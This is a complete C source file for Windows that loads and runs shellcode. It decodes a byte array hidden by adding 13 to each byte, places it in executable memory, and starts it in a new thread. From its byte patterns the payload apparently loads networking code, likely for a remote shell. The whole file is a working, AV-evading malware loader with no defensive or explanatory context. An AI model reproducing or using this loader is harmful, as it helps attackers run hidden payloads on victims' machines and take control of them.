#include <Windows.h>
#include <stdio.h>

int main() {
    const char shellcode[] = "\x09\x55\x90\xF1\xFD\xF5\xCD\x0D\x0D\x0D\x4E\x5E\x4E\x5D\x5F\x5E\x63\x55\x3E\xDF\x72\x55\x98\x5F\x6D\x55\x98\x5F\x25\x55\x98\x5F\x2D\x55\x98\x7F\x5D\x55\x1C\xC4\x57\x57\x5A\x3E\xD6\x55\x3E\xCD\xB9\x49\x6E\x89\x0F\x39\x2D\x4E\xCE\xD6\x1A\x4E\x0E\xCE\xEF\xFA\x5F\x4E\x5E\x55\x98\x5F\x2D\x98\x4F\x49\x55\x0E\xDD\x98\x8D\x95\x0D\x0D\x0D\x55\x92\xCD\x81\x74\x55\x0E\xDD\x5D\x98\x55\x25\x51\x98\x4D\x2D\x56\x0E\xDD\xF0\x63\x55\x0C\xD6\x4E\x98\x41\x95\x55\x0E\xE3\x5A\x3E\xD6\x55\x3E\xCD\xB9\x4E\xCE\xD6\x1A\x4E\x0E\xCE\x45\xED\x82\xFE\x59\x10\x59\x31\x15\x52\x46\xDE\x82\xE5\x65\x51\x98\x4D\x31\x56\x0E\xDD\x73\x4E\x98\x19\x55\x51\x98\x4D\x29\x56\x0E\xDD\x4E\x98\x11\x95\x55\x0E\xDD\x4E\x65\x4E\x65\x6B\x66\x67\x4E\x65\x4E\x66\x4E\x67\x55\x90\xF9\x2D\x4E\x5F\x0C\xED\x65\x4E\x66\x67\x55\x98\x1F\xF6\x64\x0C\x0C\x0C\x6A\x56\xCB\x84\x80\x3F\x6C\x40\x3F\x0D\x0D\x4E\x63\x56\x96\xF3\x55\x8E\xF9\xAD\x0E\x0D\x0D\x56\x96\xF2\x56\xC9\x0F\x0D\x1E\x69\xCD\xB5\x0E\x14\x4E\x61\x56\x96\xF1\x59\x96\xFE\x4E\xC7\x59\x84\x33\x14\x0C\xE2\x59\x96\xF7\x75\x0E\x0E\x0D\x0D\x66\x4E\xC7\x36\x8D\x78\x0D\x0C\xE2\x5D\x5D\x5A\x3E\xD6\x5A\x3E\xCD\x55\x0C\xCD\x55\x96\xCF\x55\x0C\xCD\x55\x96\xCE\x4E\xC7\xF7\x1C\xEC\xED\x0C\xE2\x55\x96\xD4\x77\x1D\x4E\x65\x59\x96\xEF\x55\x96\x06\x4E\xC7\xA6\xB2\x81\x6E\x0C\xE2\x55\x8E\xD1\x4D\x0F\x0D\x0D\x56\xC5\x70\x7A\x71\x0D\x0D\x0D\x0D\x0D\x4E\x5D\x4E\x5D\x55\x96\xEF\x64\x64\x64\x5A\x3E\xCD\x77\x1A\x66\x4E\x5D\xEF\x09\x73\xD4\x51\x31\x61\x0E\x0E\x55\x9A\x51\x31\x25\xD3\x0D\x75\x55\x96\xF3\x63\x5D\x4E\x5D\x4E\x5D\x4E\x5D\x56\x0C\xCD\x4E\x5D\x56\x0C\xD5\x5A\x96\xCE\x59\x96\xCE\x4E\xC7\x86\xD9\x4C\x93\x0C\xE2\x55\x3E\xDF\x55\x0C\xD7\x98\x1B\x4E\xC7\x15\x94\x2A\x6D\x0C\xE2\xC8\xFD\xC2\xAF\x63\x4E\xC7\xB3\xA2\xCA\xAA\x0C\xE2\x55\x90\xD1\x35\x49\x13\x89\x17\x8D\x08\xED\x82\x12\xC8\x54\x20\x7F\x7C\x77\x0D\x66\x4E\x96\xE7\x0C\xE2\x0D";

    // Allocate executable memory
    PVOID shellcode_exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy shellcode into allocated memory
    RtlCopyMemory(shellcode_exec, shellcode, sizeof(shellcode));
    for (int j = 0; j < sizeof shellcode; j++)
    {
		((char*)shellcode_exec)[j] = (((char*)shellcode_exec)[j]) - 13;
        printf("\\x%02X", ((unsigned char*)shellcode_exec)[j]);
	}
    DWORD threadID;
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);

    // Execute shellcode
    /*auto exec = (void(*)())shellcode_exec;
    exec(); */

    return 0;
}
